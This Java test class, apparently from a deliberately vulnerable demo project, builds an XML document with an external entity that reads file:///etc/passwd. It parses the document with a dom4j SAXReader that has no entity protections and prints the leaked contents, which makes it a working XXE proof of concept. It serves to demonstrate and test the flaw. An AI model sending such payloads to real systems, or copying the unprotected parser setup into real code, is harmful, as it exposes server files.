package org.joychou.controller;

import org.dom4j.Document;
import org.dom4j.Node;
import org.dom4j.io.SAXReader;

import java.io.StringReader;

public class TestXXE {
    public static void main(String[] args) {
        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]>\n" +
                "<kpserver>\n" +
                "<Input>\n" +
                "<Nsrsbh_JX>&xxe;</Nsrsbh_JX>\n" +
                "<Machine>test</Machine>\n" +
                "<InvoiceType>test</InvoiceType>\n" +
                "</Input>\n" +
                "</kpserver>";

        try {
            SAXReader reader = new SAXReader();
            Document document = reader.read(new StringReader(xml));
            Node node = document.selectSingleNode("//kpserver/Input/Nsrsbh_JX");
            System.out.println(node.getText());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
